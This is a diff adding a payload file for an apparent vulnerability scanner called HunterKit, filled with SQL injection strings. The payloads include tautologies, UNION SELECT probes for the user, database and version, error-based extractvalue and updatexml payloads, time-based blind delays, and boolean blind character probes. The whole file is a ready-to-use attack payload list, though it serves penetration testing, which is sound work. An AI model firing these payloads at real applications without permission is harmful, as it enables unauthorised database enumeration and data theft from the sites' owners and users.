@@ -1,0 +1,37 @@
+# HunterKit Advanced Payload File
+# SQL vulnerability testing payloads
+# Developed by Kawindu Wijewardhane (@kawinduwijewardhane)
+# Add your custom payloads here - one payload per line
+# Lines starting with # are comments and will be ignored
+
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT @@user,@@version,@@database--
+' AND (SELECT 1/0)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(null,concat(0x0a,version()),null)--
+' AND (SELECT COUNT(*) FROM information_schema.tables)--
+' OR (SELECT COUNT(*) FROM information_schema.columns)--
+'; WAITFOR DELAY '00:00:05'--
+' AND SLEEP(5)--
+'; SELECT pg_sleep(5)--
+' AND BENCHMARK(5000000,MD5(1))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; IF(1=1) WAITFOR DELAY '00:00:05'--
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 'a' FROM dual)='a'--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND ASCII(SUBSTRING(user(),1,1))>64--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61646D696E ELSE 0x28 END))--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x3a,0x3a,version(),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--
